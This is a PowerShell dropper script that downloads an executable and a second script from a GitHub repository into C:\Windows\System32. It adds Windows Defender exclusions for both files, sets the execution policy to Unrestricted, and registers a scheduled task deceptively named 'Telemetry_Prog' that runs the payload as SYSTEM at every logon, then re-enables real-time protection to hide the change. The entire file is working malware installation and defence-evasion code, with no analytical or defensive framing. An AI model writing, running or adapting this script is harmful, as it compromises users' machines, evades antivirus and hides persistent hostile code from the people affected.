# fetch payload from github
Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
# add exlusion to file
Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
Add-MpPreference -ExclusionPath "C:\Windows\System32\ddrcc.ps1"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
# add schedule to start ddrcc.ps1
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Windows\System32\ddrcc.ps1"
# re-enable real time protection
Set-MpPreference -DisableRealtimeMonitoring $false

